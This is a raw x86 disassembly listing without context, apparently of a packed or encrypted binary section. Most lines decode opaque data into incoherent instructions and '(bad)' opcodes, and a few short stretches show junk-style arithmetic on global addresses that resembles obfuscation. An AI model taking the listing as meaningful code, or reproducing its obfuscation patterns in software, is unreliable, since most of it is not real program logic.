  40ab4a:	xchg   ebx,eax
  40ab4b:	imul   esi,esi,0xa1bc6cc4
  40ab51:	xor    BYTE PTR [edx+0x1c],ch
  40ab54:	inc    edx
  40ab55:	fs popa 
  40ab57:	repz adc al,cl
  40ab5a:	dec    edi
  40ab5b:	dec    edx
  40ab5c:	pop    ss
  40ab5d:	rol    BYTE PTR [eax-0x199b55ba],0xa2
  40ab64:	sbb    edx,DWORD PTR [eax-0x23]
  40ab67:	and    ecx,DWORD PTR [ebp-0x20]
  40ab6a:	(bad)  
  40ab6b:	in     al,0x88
  40ab6d:	jle    0x40ab5d
  40ab6f:	outs   dx,BYTE PTR ds:[esi]
  40ab70:	mov    BYTE PTR [ebx-0x38],ah
  40ab73:	sbb    BYTE PTR [ecx-0xc50ad17],0xf4
  40ab7a:	aas    
  40ab7b:	add    bh,ch
  40ab7d:	cmp    DWORD PTR [eax],ebx
  40ab7f:	pop    ds
  40ab80:	or     cl,dl
  40ab82:	stc    
  40ab83:	out    dx,al
  40ab84:	loope  0x40ab60
  40ab86:	add    al,0xce
  40ab88:	arpl   di,ax
  40ab8a:	imul   esp,DWORD PTR [esi],0x80e5ee43
  40ab90:	cdq    
  40ab91:	das    
  40ab92:	cs jae 0x40aba5
  40ab95:	outs   dx,BYTE PTR ds:[esi]
  40ab96:	test   DWORD PTR [ebx+0x7],esi
  40ab99:	aad    0x75
  40ab9b:	pop    es
  40ab9c:	sub    ch,0xe4
  40ab9f:	dec    esi
  40aba0:	movq   mm0,QWORD PTR [ecx]
  40aba3:	xor    al,BYTE PTR [ebx]
  40aba5:	adc    al,0x8e
  40aba7:	jns    0x40ab66
  40aba9:	js     0x40ab31
  40abab:	mov    bl,0x8
  40abad:	call   0xf01e5fde
  40abb2:	jl     0x40ab38
  40abb4:	jmp    FWORD PTR [edx+0x57ff062c]
  40abba:	jmp    FWORD PTR gs:[ebx-0x10]
  40abbe:	and    BYTE PTR [eax],ch
  40abc0:	cmp    esi,DWORD PTR [ebx-0x40]
  40abc3:	fmul   st,st(3)
  40abc5:	sbb    al,0xa1
  40abc7:	test   edi,edx
  40abc9:	mov    esi,0x18033a98
  40abce:	les    ebp,FWORD PTR [edi]
  40abd0:	out    0xe8,eax
  40abd2:	xchg   cl,bl
  40abd4:	jge    0x40abd0
  40abd6:	lods   al,BYTE PTR ds:[esi]
  40abd7:	imul   edx,DWORD PTR [ebx],0xffffffe3
  40abda:	and    BYTE PTR [esi],bl
  40abdc:	call   0xd1d462c6
  40abe1:	pushf  
  40abe2:	ds in  eax,dx
  40abe4:	stos   DWORD PTR es:[edi],eax
  40abe5:	adc    edx,ecx
  40abe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe8:	daa    
  40abe9:	adc    bl,ah
  40abeb:	hlt    
  40abec:	imul   DWORD PTR [edx]
  40abee:	dec    ebp
  40abef:	inc    eax
  40abf0:	outs   dx,BYTE PTR ds:[esi]
  40abf1:	in     al,dx
  40abf2:	mov    esi,0x152327ab
  40abf7:	sbb    al,0x84
  40abf9:	fimul  WORD PTR [edx-0x6b]
  40abfc:	cmp    DWORD PTR [edi-0x1c9b1c68],ecx
  40ac02:	jl     0x40ab97
  40ac04:	pop    edx
  40ac05:	test   DWORD PTR [ecx+0x1cf806fa],ecx
  40ac0b:	mov    ebx,0x907cbb25
  40ac10:	ss scas al,BYTE PTR es:[edi]
  40ac12:	xlat   BYTE PTR ds:[ebx]
  40ac13:	adc    DWORD PTR [ebp+0x57d20e36],0x6b1ccf70
  40ac1d:	mov    al,BYTE PTR [bp+di+0x4932]
  40ac22:	inc    ebp
  40ac23:	add    BYTE PTR [esi],dh
  40ac25:	xchg   ecx,eax
  40ac26:	loope  0x40ac09
  40ac28:	aam    0x2
  40ac2a:	add    ch,BYTE PTR [edx-0xafd2cba]
  40ac30:	push   ebp
  40ac31:	mov    al,0x6
  40ac33:	jns    0x40abfe
  40ac35:	leave  
  40ac36:	mov    esi,0xae95745f
  40ac3b:	ja     0x40abf1
  40ac3d:	ja     0x40ac4a
  40ac3f:	aas    
  40ac40:	mov    WORD PTR [esi],es
  40ac42:	jmp    0x40ac36
  40ac44:	mov    dl,0x75
  40ac46:	adc    BYTE PTR [eax+0x79213599],0x46
  40ac4d:	test   al,0x7c
  40ac4f:	and    al,0x9e
  40ac51:	add    ecx,DWORD PTR [eax-0x3f]
  40ac54:	jno    0x40abf4
  40ac56:	leave  
  40ac57:	cmp    eax,0xcac2686a
  40ac5c:	add    dh,BYTE PTR [esi+0x2013b2ad]
  40ac62:	sbb    DWORD PTR [eax+esi*2-0x52140aa],ecx
  40ac69:	xchg   esp,eax
  40ac6a:	xchg   edx,eax
  40ac6b:	(bad)  
  40ac6c:	fsubr  QWORD PTR [esi+eax*2-0x2215e38a]
  40ac73:	loop   0x40ac47
  40ac75:	sub    DWORD PTR [edx+0x1309fb6a],eax
  40ac7b:	jbe    0x40ac3b
  40ac7d:	icebp  
  40ac7e:	stc    
  40ac7f:	pop    esp
  40ac80:	adc    esp,edx
  40ac82:	sub    al,0x4
  40ac84:	jno    0x40ac75
  40ac86:	or     edi,DWORD PTR [esi+0x365d8149]
  40ac8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac8d:	cld    
  40ac8e:	lahf   
  40ac8f:	mov    ecx,DWORD PTR [edi]
  40ac91:	cmp    bh,dl
  40ac93:	lods   al,BYTE PTR ds:[esi]
  40ac94:	or     al,0x61
  40ac96:	inc    edx
  40ac97:	push   0xfffffff4
  40ac99:	rcl    BYTE PTR [edx+0x42f6c56a],cl
  40ac9f:	push   esp
  40aca0:	add    BYTE PTR [ecx],0x7a
  40aca3:	int3   
  40aca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca5:	bound  esi,QWORD PTR [edx-0x623c4c89]
  40acab:	popa   
  40acac:	(bad)  
  40acae:	aam    0x39
  40acb0:	pop    eax
  40acb1:	fisub  WORD PTR [esi+0x1e]
  40acb4:	jl     0x40ac4e
  40acb6:	call   0x944c:0x3feae4f4
  40acbd:	aaa    
  40acbe:	xchg   edx,eax
  40acbf:	nop
  40acc0:	sbb    eax,0x51023503
  40acc5:	add    ebx,ebx
  40acc7:	or     al,0x3f
  40acc9:	sbb    DWORD PTR [edx+0x15],ecx
  40accc:	cld    
  40accd:	retf   
  40acce:	js     0x40ad11
  40acd0:	cwde   
  40acd1:	js     0x40acf4
  40acd3:	js     0x40ace9
  40acd5:	mov    ah,0xca
  40acd7:	inc    edi
  40acd8:	(bad)  
  40acda:	ds (bad) 
  40acdc:	outs   dx,BYTE PTR ds:[esi]
  40acdd:	push   0x759c2497
  40ace2:	pop    ss
  40ace3:	(bad)  
  40ace4:	jb     0x40ad08
  40ace6:	aad    0x71
  40ace8:	add    dl,BYTE PTR [edx+0x4d]
  40aceb:	shr    edx,1
  40aced:	cwde   
  40acee:	dec    esi
  40acef:	loop   0x40acdf
  40acf1:	(bad)  
  40acf2:	les    cx,DWORD PTR [esi+0x3c]
  40acf6:	lods   al,BYTE PTR ds:[esi]
  40acf7:	arpl   WORD PTR [ebp+0x5c3d2606],bp
  40acfd:	xlat   BYTE PTR ds:[ebx]
  40acfe:	xor    eax,0xb5a9acff
  40ad03:	and    DWORD PTR [esi],edi
  40ad05:	out    0x37,al
  40ad07:	fdiv   st(5),st
  40ad09:	or     eax,0xc5121fc0
  40ad0e:	pusha  
  40ad0f:	mov    ecx,0x76f29002
  40ad14:	dec    ebp
  40ad15:	pop    esi
  40ad16:	test   DWORD PTR ds:0x4ec6692d,eax
  40ad1c:	test   al,0x13
  40ad1e:	retf   
  40ad1f:	push   ecx
  40ad20:	inc    edi
  40ad21:	jg     0x40acd8
  40ad23:	cmp    ah,ch
  40ad25:	push   eax
  40ad26:	jl     0x40ad79
  40ad28:	fwait
  40ad29:	aaa    
  40ad2a:	push   cs
  40ad2b:	bound  esi,QWORD PTR [ecx+0x3a]
  40ad2e:	popf   
  40ad2f:	adc    eax,0x2c3da7e7
  40ad34:	mov    edx,0xb518cf9c
  40ad39:	stc    
  40ad3a:	and    esp,DWORD PTR [edx]
  40ad3c:	mov    al,ds:0xac8afd1e
  40ad41:	out    0x6,eax
  40ad43:	scas   eax,DWORD PTR es:[edi]
  40ad44:	pop    eax
  40ad45:	jae    0x40ad8a
  40ad47:	std    
  40ad48:	test   BYTE PTR [esi+0x1d],dh
  40ad4b:	and    BYTE PTR [edx+0x1a],ah
  40ad4e:	jg     0x40ad76
  40ad50:	pop    ss
  40ad51:	xor    eax,0xf2de134a
  40ad56:	dec    ecx
  40ad57:	shl    BYTE PTR [eax],1
  40ad59:	sti    
  40ad5a:	pop    edx
  40ad5b:	push   cs
  40ad5c:	lds    esp,FWORD PTR ds:0x78d67530
  40ad62:	dec    esi
  40ad63:	xchg   BYTE PTR [edx+0x2439196e],dh
  40ad69:	or     bl,BYTE PTR [esi+0x1a1fbc27]
  40ad6f:	pop    ebx
  40ad70:	aaa    
  40ad71:	or     eax,0x96d25b7a
  40ad76:	push   cs
  40ad77:	into   
  40ad78:	ss xchg ebp,eax
  40ad7a:	shr    DWORD PTR [edi+edi*1+0x7b2ec69c],cl
  40ad81:	aad    0x86
  40ad83:	lods   eax,DWORD PTR ds:[esi]
  40ad84:	out    dx,eax
  40ad85:	out    0x5a,al
  40ad87:	cld    
  40ad88:	or     BYTE PTR [esi-0xdcaa5fa],0x2d
  40ad8f:	lahf   
  40ad90:	mov    ch,0xe6
  40ad92:	sub    edx,edi
  40ad94:	mov    ?,WORD PTR [esi]
  40ad96:	test   BYTE PTR [edx+0x74a743ab],al
  40ad9c:	les    ecx,FWORD PTR [ecx+edx*1+0x55]
  40ada0:	sbb    BYTE PTR [esi+0x3b4eb3df],0x9c
  40ada7:	mov    esp,0x5ab2994
  40adac:	push   cs
  40adad:	call   0xd174fe72
  40adb2:	mov    al,0x7d
  40adb4:	imul   ebp,DWORD PTR [ecx+0x7acded88],0x85ea7836
  40adbe:	dec    eax
  40adbf:	inc    edi
  40adc0:	adc    DWORD PTR [edx],esp
  40adc2:	push   ecx
  40adc3:	mov    eax,0x7084ccae
  40adc8:	mov    ecx,0xcc40993c
  40adcd:	adc    BYTE PTR [edi+esi*1+0x14],0x4a
  40add2:	vpaddsb ymm1,ymm1,YMMWORD PTR [edx+0x2a]
  40add7:	mov    eax,ds:0x420450b0
  40addc:	push   esi
  40addd:	lahf   
  40adde:	fs push ds
  40ade0:	dec    esi
  40ade1:	mov    dh,0xe8
  40ade3:	mov    cl,0xb6
  40ade5:	and    dh,BYTE PTR [eax-0x148ce735]
  40adeb:	sub    eax,0xc8c473e9
  40adf0:	aas    
  40adf1:	pop    ebp
  40adf2:	cld    
  40adf3:	aaa    
  40adf4:	loope  0x40ae68
  40adf6:	or     eax,0xd202d91c
  40adfb:	xor    BYTE PTR [ecx+0x781c6a58],ch
  40ae01:	dec    edx
  40ae02:	inc    esi
  40ae03:	push   eax
  40ae04:	lea    esp,[edx]
  40ae06:	sti    
  40ae07:	push   cs
  40ae08:	shl    al,0x4c
  40ae0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae0c:	repnz fadd QWORD PTR [ebx-0x1fa7c40f]
  40ae13:	dec    edi
  40ae14:	push   cs
  40ae15:	add    ebp,DWORD PTR [ecx-0x65]
  40ae18:	pop    esp
  40ae19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae1a:	retf   
  40ae1b:	push   edi
  40ae1c:	call   0xe810187b
  40ae21:	outs   dx,BYTE PTR ds:[esi]
  40ae22:	call   DWORD PTR [ecx]
  40ae24:	push   ss
  40ae25:	clc    
  40ae26:	mov    ch,0x54
  40ae28:	sub    BYTE PTR [edi+ebp*2],dl
  40ae2b:	fs imul edx
  40ae2e:	jg     0x40ae0b
  40ae30:	popa   
  40ae31:	push   eax
  40ae32:	jno    0x40ae1e
  40ae34:	fsub   DWORD PTR [eax]
  40ae36:	retf   
  40ae37:	popa   
  40ae38:	and    eax,0x8618450c
  40ae3d:	inc    ebx
  40ae3e:	push   esp
  40ae3f:	fs mov dh,0xa4
  40ae42:	adc    bh,dl
  40ae44:	ret    
  40ae45:	jecxz  0x40ae9b
  40ae47:	add    al,0x62
  40ae49:	mov    DWORD PTR [ebp-0x20],0x6ec3
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42826b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428233
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428367,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42824b
  40aea0:	cmp    DWORD PTR ds:0x42826b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x42809b
  40aebd:	call   DWORD PTR ds:0x428e58
  40aec3:	mov    ecx,DWORD PTR ds:0x4282eb
  40aec9:	xor    DWORD PTR ds:0x42820f,ecx
  40aecf:	or     DWORD PTR ds:0x42835b,ecx
  40aed5:	or     DWORD PTR ds:0x428273,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42827f
  40aee1:	adc    DWORD PTR ds:0x428247,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428143
  40aeef:	adc    ecx,DWORD PTR ds:0x428367
  40aef5:	mov    DWORD PTR ds:0x428143,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428363,0x4282d7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428143,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	add    BYTE PTR [ebp+0x1bb57e21],0x18
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	pop    ss
  40af3c:	scas   al,BYTE PTR es:[edi]
  40af3d:	sub    dh,bh
  40af3f:	lahf   
  40af40:	pop    ebp
  40af41:	sub    eax,0x17db6f41
  40af46:	xor    bl,BYTE PTR [ebx+ebp*4+0x16]
  40af4a:	(bad)  
  40af4b:	imul   BYTE PTR [ebx-0x59]
  40af4e:	mov    dl,BYTE PTR [edi-0x3d]
  40af51:	sbb    BYTE PTR [eax-0x15],bh
  40af54:	sub    al,0x8e
  40af56:	add    edi,DWORD PTR [edi+0x6d9d7435]
  40af5c:	xchg   BYTE PTR [eax+ebp*1+0x53],ch
  40af60:	adc    ebx,esi
  40af62:	xchg   esi,eax
  40af63:	loope  0x40afda
  40af65:	enter  0x8689,0x94
  40af69:	ret    0x9988
  40af6c:	sub    al,0x79
  40af6e:	jns    0x40afdc
  40af70:	adc    ebp,DWORD PTR [ebx]
  40af72:	push   ecx
  40af73:	jb     0x40aeff
  40af75:	test   BYTE PTR [edi-0x4033c550],0xd1
  40af7c:	addr16 hlt 
  40af7e:	fcomp  DWORD PTR [edi+0x69]
  40af81:	xor    al,0x4b
  40af83:	add    eax,0x24b85e86
  40af88:	adc    eax,0xb8143a92
  40af8d:	mov    bh,0x7d
  40af8f:	lahf   
  40af90:	add    ebp,eax
  40af92:	ins    DWORD PTR es:[edi],dx
  40af93:	in     al,dx
  40af94:	loopne 0x40af22
  40af96:	push   ebx
  40af97:	cs mov al,0x2c
  40af9a:	jmp    0x252b:0x3a042045
  40afa1:	adc    edx,edx
  40afa3:	adc    eax,0x713862e3
  40afa8:	sbb    dl,BYTE PTR [ebp-0x441e4639]
  40afae:	mov    dl,0x8c
  40afb0:	jmp    0x1363:0x21754405
  40afb7:	(bad)  
  40afb8:	pop    edi
  40afb9:	cmovne eax,DWORD PTR [ebx]
  40afbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afbd:	sub    DWORD PTR [eax+0x57],edx
  40afc0:	or     ebx,esi
  40afc2:	lock rcr DWORD PTR [eax+ecx*2],0xb9
  40afc7:	icebp  
  40afc8:	mov    edi,0x13fab122
  40afcd:	adc    eax,0xfe532256
  40afd2:	or     BYTE PTR [ebp+0xf],0x6b
  40afd6:	jno    0x40afb5
  40afd8:	push   esp
  40afd9:	inc    BYTE PTR [ebp+ecx*2-0x6e93670a]
  40afe0:	dec    esi
  40afe1:	push   ecx
  40afe2:	scas   eax,DWORD PTR es:[edi]
  40afe3:	xlat   BYTE PTR ds:[ebx]
  40afe4:	aaa    
  40afe5:	stc    
  40afe6:	retf   0xa7cd
  40afe9:	mov    bl,0x96
  40afeb:	(bad)  
  40afec:	mov    eax,0x8e8d8ab4
  40aff1:	outs   dx,DWORD PTR ds:[esi]
  40aff2:	ret    0xf8a8
  40aff5:	and    ah,BYTE PTR [edx+0x64]
  40aff8:	into   
  40aff9:	mov    esp,0x749a9eca
  40affe:	repz dec esi
  40b000:	test   DWORD PTR [esi-0x13],edi
  40b003:	xor    esp,DWORD PTR [ecx+0xd27a17f]
  40b009:	popa   
  40b00a:	jge    0x40afc8
  40b00c:	jmp    0xd869c346
  40b011:	dec    ecx
  40b012:	outs   dx,DWORD PTR ds:[esi]
  40b013:	mov    ds:0x5aa91bb8,al
  40b018:	jl     0x40b066
  40b01a:	cmp    DWORD PTR [eax],ebx
  40b01c:	in     eax,dx
  40b01d:	sub    eax,DWORD PTR [eax+esi*2+0x386d6949]
  40b024:	mov    ebp,0x74bdca79
  40b029:	mov    BYTE PTR ds:0xba99055,0xac
  40b030:	inc    ebp
  40b031:	inc    eax
  40b032:	mov    dl,0x2e
  40b034:	dec    eax
  40b035:	and    esp,eax
  40b037:	jb     0x40b067
  40b039:	ffree  st(0)
  40b03b:	cmp    DWORD PTR [edx-0x37],edi
  40b03e:	adc    BYTE PTR [ebp-0x30947756],dl
  40b044:	jb     0x40b0b7
  40b046:	sub    bh,dl
  40b048:	add    eax,0xeef314e0
  40b04d:	sbb    BYTE PTR ds:0x343fd943,ah
  40b053:	cmp    cl,bh
  40b055:	sub    esi,DWORD PTR [ecx]
  40b057:	js     0x40b023
  40b059:	push   ecx
  40b05a:	jecxz  0x40b0ae
  40b05c:	mov    edi,0x1cec1d94
  40b061:	mov    bl,0x14
  40b063:	pop    ebp
  40b064:	cmp    BYTE PTR [ebx-0x63],0x7b
  40b068:	push   es
  40b069:	sbb    cl,BYTE PTR [edx-0x41]
  40b06c:	ins    DWORD PTR es:[edi],dx
  40b06d:	mov    ah,BYTE PTR [edx-0x31db2721]
  40b073:	(bad)  [esi-0x50422354]
  40b079:	ss inc ebp
  40b07b:	pop    ds
  40b07c:	jne    0x40b04c
  40b07e:	(bad)  
  40b07f:	mov    esi,0x6f72ee00
  40b084:	jp     0x40b0fe
  40b086:	dec    ecx
  40b087:	or     BYTE PTR [eax+0x37a19f56],cl
  40b08d:	lahf   
  40b08e:	in     eax,0x6a
  40b090:	aad    0x3f
  40b092:	xor    DWORD PTR [ecx+0x26],esp
  40b095:	daa    
  40b096:	cmp    DWORD PTR [ebp-0xc],eax
  40b099:	xchg   edi,eax
  40b09a:	jmp    0x4bdee5bc
  40b09f:	scas   eax,DWORD PTR es:[edi]
  40b0a0:	dec    esi
  40b0a1:	gs scas al,BYTE PTR es:[edi]
  40b0a3:	fiadd  WORD PTR [edx-0x4235bf12]
  40b0a9:	push   ebp
  40b0aa:	mov    eax,DWORD PTR [edi-0x7167d011]
  40b0b0:	enter  0xdc09,0xb0
  40b0b4:	imul   eax,DWORD PTR [esi],0x8c63569e
  40b0ba:	addr16 or bl,cl
  40b0bd:	push   esp
  40b0be:	mov    ch,0x91
  40b0c0:	test   al,0xf1
  40b0c2:	aaa    
  40b0c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c5:	inc    eax
  40b0c6:	fmul   QWORD PTR [ebp-0x4e2522e1]
  40b0cc:	jp     0x40b0f9
  40b0ce:	mov    esp,0x30474a48
  40b0d3:	adc    ch,ah
  40b0d5:	sub    al,BYTE PTR [edi+0x24c94918]
  40b0db:	dec    esp
  40b0dc:	in     al,0x92
  40b0de:	les    edi,FWORD PTR [esi-0x6a]
  40b0e1:	fisub  DWORD PTR cs:[esi-0x461a2dbd]
  40b0e8:	(bad)  
  40b0ea:	xor    al,0xfd
  40b0ec:	(bad)  
  40b0ed:	add    ebx,edi
  40b0ef:	inc    edx
  40b0f0:	int3   
  40b0f1:	xor    DWORD PTR [ebx-0x665b4f94],ecx
  40b0f7:	arpl   WORD PTR [ecx],ax
  40b0f9:	je     0x40b11f
  40b0fb:	pop    ebx
  40b0fc:	stc    
  40b0fd:	fwait
  40b0fe:	lds    edx,FWORD PTR [edi]
  40b100:	addr16 pop esp
  40b102:	in     eax,dx
  40b103:	inc    ebp
  40b104:	pop    ds
  40b105:	in     al,dx
  40b106:	and    ch,dl
  40b108:	mov    eax,ds:0x6af40110
  40b10d:	mov    ebx,0xb126508
  40b112:	pop    ds
  40b113:	nop
  40b114:	dec    esi
  40b115:	sub    eax,0x4fdf4207
  40b11a:	mov    dh,0xac
  40b11c:	add    eax,0x9da3b4d8
  40b121:	loop   0x40b12a
  40b123:	and    bl,BYTE PTR [ebx+esi*2]
  40b126:	ds lahf 
  40b128:	pop    ebx
  40b129:	cmp    al,0x85
  40b12b:	push   eax
  40b12c:	stos   BYTE PTR es:[edi],al
  40b12d:	mov    cs,WORD PTR [ebx]
  40b12f:	mov    al,ds:0xe4051c88
  40b134:	mov    esi,0x32cfdc87
  40b139:	dec    esp
  40b13a:	lods   al,BYTE PTR ds:[esi]
  40b13b:	rcl    cl,1
  40b13d:	sub    eax,0x7177ed71
  40b142:	push   edi
  40b143:	inc    esi
  40b144:	xchg   esi,eax
  40b145:	and    eax,0x75ae0ebb
  40b14a:	aad    0xc4
  40b14c:	adc    bl,BYTE PTR [edx-0x209a6cab]
  40b152:	fwait
  40b153:	mul    BYTE PTR [ebx-0x7a]
  40b156:	mov    ss,WORD PTR [edx-0xb]
  40b159:	cmp    eax,0xeb51c14c
  40b15e:	cwde   
  40b15f:	xor    eax,0xea74e6de
  40b164:	mov    eax,ds:0xaeaca62a
  40b169:	fcomp  DWORD PTR [edi]
  40b16b:	inc    ebp
  40b16c:	xchg   ecx,eax
  40b16d:	(bad)  
  40b16e:	and    BYTE PTR [ebx+0xfa1f5b0],ch
  40b174:	mov    ss,WORD PTR [edx-0x2bbbdad2]
  40b17a:	jnp    0x40b16a
  40b17c:	dec    ebp
  40b17d:	sub    edi,eax
  40b17f:	push   ss
  40b180:	push   es
  40b181:	test   DWORD PTR [ecx-0x237bf36e],esp
  40b187:	jmp    0x23cb:0x337796fe
  40b18e:	inc    esp
  40b18f:	push   esi
  40b190:	ret    0x51fc
  40b193:	sub    bl,dh
  40b195:	and    eax,0x19f93bd0
  40b19a:	mov    eax,0xd2ba844
  40b19f:	xchg   edx,eax
  40b1a0:	pop    ds
  40b1a1:	xor    eax,0x184d3d8b
  40b1a6:	int    0x55
  40b1a8:	scas   al,BYTE PTR es:[edi]
  40b1a9:	jne    0x40b1fa
  40b1ab:	arpl   WORD PTR [esi],cx
  40b1ad:	jns    0x40b224
  40b1af:	jb     0x40b22e
  40b1b1:	lahf   
  40b1b2:	pushf  
  40b1b3:	in     al,0xf8
  40b1b5:	or     ch,BYTE PTR [ebx+0x4e]
  40b1b8:	pop    esp
  40b1b9:	dec    ecx
  40b1ba:	rol    ebp,cl
  40b1bc:	rol    BYTE PTR ds:0x9038e26d,0x40
  40b1c3:	(bad)  
  40b1c4:	cmp    DWORD PTR [edi],esp
  40b1c6:	jmp    0xdfd25087
  40b1cb:	sub    al,0x2d
  40b1cd:	add    DWORD PTR [edi+ebp*2+0x4a],esp
  40b1d1:	fdivr  st,st(3)
  40b1d3:	mov    eax,0x6f54a09e
  40b1d8:	push   es
  40b1d9:	xchg   ecx,eax
  40b1da:	out    0xea,al
  40b1dc:	aas    
  40b1dd:	mov    bl,0xc9
  40b1df:	test   BYTE PTR ds:[esi+0x61],bl
  40b1e3:	jmp    0x40b20e
  40b1e5:	retf   
  40b1e6:	ret    0xe93d
  40b1e9:	push   ds
  40b1ea:	dec    ecx
  40b1eb:	pop    eax
  40b1ec:	aaa    
  40b1ed:	pop    es
  40b1ee:	fwait
  40b1ef:	(bad)  
  40b1f0:	mov    ds:0xecc4bd85,eax
  40b1f5:	pop    es
  40b1f6:	lds    edx,FWORD PTR [ebp+0x29]
  40b1f9:	fnstcw WORD PTR [ecx+0x4c]
  40b1fc:	or     eax,0x1b69d048
  40b201:	jb     0x40b200
  40b203:	mov    esi,0x492452bb
  40b208:	mov    ebx,0x4d243b69
  40b20d:	fisub  DWORD PTR [ebp-0x71786e12]
  40b213:	pop    ds
  40b214:	push   eax
  40b215:	out    0xe4,eax
  40b217:	mov    ch,0xaa
  40b219:	jge    0x40b240
  40b21b:	jnp    0x40b247
  40b21d:	mov    al,0xb7
  40b21f:	(bad)  
  40b221:	jo     0x40b203
  40b223:	ficom  DWORD PTR [edi+0x202a3f0a]
  40b229:	inc    ebp
  40b22a:	stos   BYTE PTR es:[edi],al
  40b22b:	add    DWORD PTR [ebp+0x4a],0xe1ec34c3
  40b232:	cmp    al,0x5e
  40b234:	das    
  40b235:	test   eax,0xf7048869
  40b23a:	dec    edx
  40b23b:	shl    WORD PTR [eax-0x1f],1
  40b23f:	cmp    DWORD PTR [edi+0x143bd2d],esp
  40b245:	pop    ds
  40b246:	jecxz  0x40b1de
  40b248:	mov    bl,0x64
  40b24a:	push   0x9f1a0584
  40b24f:	cmp    al,0x78
  40b251:	daa    
  40b252:	cmp    dl,al
  40b254:	mov    edx,0x4fd70073
  40b259:	ins    BYTE PTR es:[edi],dx
  40b25a:	push   esi
  40b25b:	inc    ebx
  40b25c:	cdq    
  40b25d:	jmp    0x4552:0xc01a5dd9
  40b264:	arpl   WORD PTR [ebx-0x3bf47219],cx
  40b26a:	jl     0x40b2d8
  40b26c:	or     bh,BYTE PTR [ebx+0x40]
  40b26f:	xchg   edx,eax
  40b270:	jnp    0x40b27e
  40b272:	jle    0x40b2e4
  40b274:	inc    eax
  40b275:	dec    esi
  40b276:	sbb    DWORD PTR [ebp-0x7b6a1771],edi
  40b27c:	or     cl,BYTE PTR [ecx]
  40b27e:	inc    ecx
  40b27f:	nop
  40b280:	pop    eax
  40b281:	push   cs
  40b282:	jns    0x40b298
  40b284:	sahf   
  40b285:	popf   
  40b286:	fucomp st(0)
  40b288:	ret    
  40b289:	cmp    ecx,eax
  40b28b:	ja     0x40b25b
  40b28d:	add    eax,0x986cd64b
  40b292:	jmp    FWORD PTR [esi-0x12]
  40b295:	mov    ds:0x4988601b,eax
  40b29a:	int3   
  40b29b:	inc    edx
  40b29c:	retf   
  40b29d:	dec    edx
  40b29e:	mov    ebx,0x5989705
  40b2a3:	jo     0x40b2e8
  40b2a5:	adc    esp,DWORD PTR [ebx+0x45]
  40b2a8:	std    
  40b2a9:	leave  
  40b2aa:	call   0xc83076b9
  40b2af:	cli    
  40b2b0:	leave  
  40b2b1:	daa    
  40b2b2:	jmp    0x40b28d
  40b2b4:	iret   
  40b2b5:	sub    al,0x19
  40b2b7:	scas   al,BYTE PTR es:[edi]
  40b2b8:	fwait
  40b2b9:	ret    0xf648
  40b2bc:	adc    DWORD PTR [ecx+0x25718959],esi
  40b2c2:	sub    eax,0x5931499d
  40b2c7:	sbb    eax,0x23f865
  40b2cc:	stos   BYTE PTR es:[edi],al
  40b2cd:	or     al,0xcc
  40b2cf:	test   BYTE PTR [ebx+ebx*2],bh
  40b2d2:	sub    al,0x52
  40b2d4:	xlat   BYTE PTR ds:[ebx]
  40b2d5:	jnp    0x40b2d7
  40b2d7:	int3   
  40b2d8:	xchg   ebp,eax
  40b2d9:	fadd   DWORD PTR [ecx+0x6643612b]
  40b2df:	out    0xab,eax
  40b2e1:	test   eax,0x88f4401d
  40b2e6:	sbb    BYTE PTR [ebx-0x54],0xfa
  40b2ea:	aam    0x71
  40b2ec:	bound  ecx,QWORD PTR [eax]
  40b2ee:	sub    BYTE PTR [ebx+ebp*8],ch
  40b2f1:	repz aad 0xd0
  40b2f4:	jecxz  0x40b29e
  40b2f6:	outs   dx,DWORD PTR ds:[esi]
  40b2f7:	pop    edx
  40b2f8:	mov    edi,0x56c81f7a
  40b2fd:	mul    DWORD PTR [edi-0x708fed8]
  40b303:	add    ebp,DWORD PTR [ebp-0x10a42b77]
  40b309:	ja     0x40b2fe
  40b30b:	enter  0xdcfe,0xb
  40b30f:	scas   eax,DWORD PTR es:[edi]
  40b310:	std    
  40b311:	push   esp
  40b312:	pop    esi
  40b313:	pop    es
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x4282cb,0x428283
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x428277
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42820b,0x4282cb
